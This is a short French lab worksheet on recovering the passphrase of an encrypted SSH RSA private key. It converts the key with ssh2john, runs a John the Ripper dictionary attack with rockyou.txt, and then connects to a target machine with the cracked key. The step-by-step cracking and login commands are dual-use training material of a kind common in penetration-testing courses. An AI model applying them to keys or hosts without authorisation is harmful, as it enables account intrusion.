# TP – Craquage d’une clé RSA avec John the Ripper

## Objectif
Retrouver la **passphrase d’une clé privée SSH (RSA)** protégée, puis l’utiliser pour se connecter à une machine distante.

> Cette méthodologie s’applique uniquement dans un cadre **légal et autorisé**  

---

## 1. Identification du fichier

Vérifier le type du fichier fourni.

```bash
file id_rsa
````
** Résultat attendu :**

- OpenSSH private key
- Ou PEM RSA private key
- Si la clé n’est pas chiffrée, aucun craquage n’est nécessaire.

## 2. Conversion de la clé pour John

John the Ripper ne travaille pas directement sur la clé RSA.
Il faut la convertir en hash compatible.

````
ssh2john id_rsa > rsa_hash.txt
````

Le fichier rsa_hash.txt contient le hash exploitable par John.

## 3. Craquage avec John the Ripper

Lancer une attaque par dictionnaire.
````
john --wordlist=/chemin/vers/rockyou.txt rsa_hash.txt
````

John détecte automatiquement le format :

````
SSH private key [RSA/DSA/EC/OPENSSH]
````
Il est inutile de forcer --format.

## 4. Affichage du mot de passe trouvé
````
john --show rsa_hash.txt
````

## 5. Préparation de la clé pour SSH

Restreindre les permissions (obligatoire pour SSH) :
````
chmod 600 id_rsa
````
## 6. Connexion SSH avec la clé
````
ssh -i id_rsa user@IP_CIBLE
````

## 7. Lorsqu’elle est demandée :

Enter passphrase for key 'id_rsa':

- Entrer la passphrase trouvée.

## 8. Résumé rapide des commandes
````
ssh2john id_rsa > rsa_hash.txt
john --wordlist=rockyou.txt rsa_hash.txt
john --show rsa_hash.txt
chmod 600 id_rsa
ssh -i id_rsa user@IP
````
